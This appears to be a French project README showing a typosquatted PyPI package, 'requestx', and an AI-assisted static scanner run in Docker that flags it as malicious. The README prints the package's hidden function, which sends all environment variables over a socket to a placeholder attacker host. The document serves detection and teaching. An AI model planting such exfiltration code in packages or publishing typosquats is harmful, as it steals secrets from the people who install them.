# Projet RequestX : Détection d’un Paquet Python Malveillant

## 1. Introduction

Les dépôts publics comme **PyPI** constituent une cible privilégiée pour les attaques de la chaîne d’approvisionnement logicielle (*supply-chain attacks*).  
Un attaquant peut en effet publier un paquet qui paraît légitime mais contient du code malveillant.  
Une fois installé, ce paquet peut compromettre la machine de la victime en exfiltrant des données sensibles.  

L’objectif de ce projet est de :

1. Illustrer la création et la publication d’un paquet Python **compromis**.
2. Montrer comment un outil d’analyse peut détecter les comportements malveillants.
3. Démontrer que l’analyse est fiable en testant également un paquet **inoffensif**.

---

## 2. Paquet compromis : `requestx`

Le paquet **`requestx`** a été conçu pour imiter une librairie Python utile.  
Derrière cette façade légitime, son fichier principal contient du code malveillant qui exfiltre les variables d’environnement vers un serveur externe.

- **Code malveillant :**

```python
# Exfiltration de toutes les variables d'environnement
def _exfiltrate_env():
    try:
        env_vars = json.dumps(dict(os.environ))
        s = socket.socket()
        s.connect(("ip.hacker", port.hacker))  # Connexion au serveur de l’attaquant
        s.send(env_vars.encode())
        s.close()
    except Exception:
        pass

```
Ainsi, un utilisateur qui installe et utilise ce paquet croit bénéficier d’une librairie pratique, mais son système est immédiatement compromis.

---

## 3. Paquet témoin : `requestx_safe`

Afin de valider l’efficacité de l’outil d’analyse, un second paquet a été créé : **`requestx_safe`**.
Celui-ci ne contient **aucune fonctionnalité malveillante**.
Son rôle est uniquement de démontrer que l’analyse fait correctement la distinction entre un paquet compromis et un paquet sain.

---

## 4. Analyse des paquets

L’analyse des paquets Python doit se faire dans un environnement **sécurisé et isolé** afin d’éviter toute exécution dangereuse de code malveillant.
Pour cela, le processus complet est exécuté **dans un conteneur Docker dédié**, qui assure un confinement strict.

De plus, l’étape d’interprétation du code est confiée à une **IA spécialisée** : celle-ci examine les fichiers Python, détecte des motifs suspects et rend un verdict accompagné de détails.
L’approche combine donc **isolation technique** (Docker) et **intelligence artificielle** (analyse de code).

---

### Étapes de l’analyse :

1. **Soumission du paquet** : un package Python est téléchargé dans le conteneur Docker.
2. **Extraction du contenu** : le paquet est décompressé (fichiers `.py`, `pyproject.toml`, etc.).
3. **Scan statique** : chaque fichier Python est lu, sans exécution, afin d’éviter les risques.
4. **Analyse par IA** : le contenu de chaque fichier est envoyé à un modèle d’IA, qui :

   * identifie des comportements dangereux (exfiltration, accès aux secrets, etc.),
   * distingue les fonctions légitimes des actions suspectes,
   * fournit un verdict explicite (`safe` / `malicious`).
5. **Rapport JSON** : les résultats sont restitués de manière structurée pour chaque fichier Python trouvé.

---

### Schéma ASCII du processus d’analyse

```ascii
[ Paquet Python ] --> [ Docker isolé ] --> [ Extraction contenu ] --> [ Scan statique ] --> [ Analyse IA ] --> [ Rapport JSON ]
```

---

### Exemples de résultats

**Pour le paquet compromis `requestx` :**

<img width="1116" height="578" alt="image" src="https://github.com/user-attachments/assets/bb13b828-b71e-466b-ad85-c875d15c11dc" />

**Pour le paquet témoin `requestx_safe` :**

<img width="1125" height="903" alt="image" src="https://github.com/user-attachments/assets/8946fcbd-ad13-4c3e-aa57-1101df03033d" />

---

### Interprétation

* Dans le cas de **`requestx`**, l’IA détecte que le fichier accède aux variables d’environnement et les envoie vers un serveur externe → verdict **malicious**.
* Dans le cas de **`requestx_safe`**, le code se limite à une fonction légitime et ne contient aucun comportement dangereux → verdict **safe**.

Ces résultats démontrent la capacité du système à **détecter un code malveillant même dans un package qui semble légitime**, tout en reconnaissant correctement les paquets sûrs.

---

## 5. Discussion : Supply-Chain Attacks et Typosquatting

Ce projet illustre un scénario réaliste de **supply-chain attack** où un paquet Python publié sur un dépôt officiel peut contenir du code malveillant.
Un utilisateur non vigilant qui installe ce paquet compromet immédiatement son environnement.

En complément, un autre risque fréquent est le **typosquatting** : un attaquant publie un paquet avec un nom très proche d’un paquet populaire (`requestx` au lieu de `requests`) pour piéger les utilisateurs.

---

## 6. Conclusion

Ce projet met en évidence la facilité avec laquelle un paquet Python peut être compromis, et l’importance d’outils d’analyse automatisés et isolés pour renforcer la sécurité de la chaîne d’approvisionnement logicielle.

```
